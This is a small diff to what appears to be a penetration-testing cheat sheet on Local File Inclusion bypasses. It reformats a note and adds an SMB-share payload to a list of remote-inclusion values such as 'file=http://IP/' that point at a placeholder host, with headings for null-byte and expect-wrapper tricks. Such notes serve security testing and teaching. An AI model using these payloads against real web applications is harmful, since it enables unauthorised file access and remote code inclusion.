@@ -2,7 +2,7 @@
 
 ## Workarounds
 
-`NOTE:` **`Read the file that is running LFI`**`to get more information about the code.`
+NOTE: **Read the file that is running LFI** to get more information about the code.
 
 ```bash
 # using null byte %00
@@ -18,6 +18,7 @@
 # protocol wraper
 file=http://IP/
 file=ftp://IP/
+file=//IP/smb-share/file
 
 # expect wrapper
 # allows to run system commands
